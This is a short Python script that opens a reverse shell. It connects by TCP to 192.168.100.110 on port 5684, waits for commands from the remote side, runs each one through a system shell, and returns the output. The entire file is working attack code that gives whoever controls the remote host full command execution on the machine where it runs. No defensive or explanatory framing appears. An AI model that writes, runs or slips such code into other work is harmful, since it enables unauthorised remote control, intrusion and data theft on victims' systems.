
import socket
import subprocess
def con_client(rhost,rport):
    get= socket.socket()
    get.connect((rhost, rport))
    while True:
        exec = get.recv(1024)
        exec = exec.decode()
        resp = subprocess.Popen(exec, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        response = resp.stdout.read()
        null_resp = resp.stderr.read()
        get.send(response + null_resp)

con_client('192.168.100.110',5684)
        